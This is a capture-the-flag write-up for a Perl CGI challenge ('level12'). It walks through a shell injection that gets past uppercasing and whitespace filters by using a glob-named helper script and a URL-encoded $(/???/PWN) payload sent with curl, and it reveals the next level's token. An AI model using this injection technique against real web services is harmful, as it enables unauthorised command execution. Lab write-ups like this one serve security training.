# level12 (bonus)

## Goal
Run `getflag` as `flag12` through the Perl CGI on port 4646.

## Recon
```perl
sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;              # (1) UPPERCASE the input
  $xx =~ s/\s.*//;                 # (2) cut everything from the first whitespace
  @output = `egrep "^$xx" /tmp/xd 2>&1`;   # (3) shell injection point
  ...
}
n(t(param("x"), param("y")));
```

`x` is injected into a backtick command (running as **flag12**), but two filters bite:

1. It is **uppercased**, so we cannot type `getflag` (becomes `GETFLAG`).
2. It is **cut at the first whitespace**, so we cannot use spaces.

## Exploit - glob wildcards + an uppercase helper name
Shell glob metacharacters (`?`, `*`) and uppercase names survive the uppercasing.
So we drop a helper script whose *name* has no lowercase, and reach it with a `?`
glob for the lowercase path components:

```sh
# helper (contents are NOT uppercased -> lowercase is fine here)
printf '#!/bin/sh\n/bin/getflag > /tmp/L12TOK 2>&1\nchmod 666 /tmp/L12TOK\n' > /tmp/PWN
chmod 755 /tmp/PWN

# x = $(/???/PWN)  -> /??? globs to /tmp, runs /tmp/PWN as flag12. No lowercase, no spaces.
curl -s 'http://localhost:4646/?x=%24%28%2F%3F%3F%3F%2FPWN%29&y=1'
cat /tmp/L12TOK
# Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

The evaluated shell command is `egrep "^$(/???/PWN)" /tmp/xd 2>&1`; the `$( )` runs
`/tmp/PWN`, which runs getflag as flag12 into a readable file.

## Result
- **level13 password (token):** `g1qKMiRpXf53AWhDaU7FEkczr`
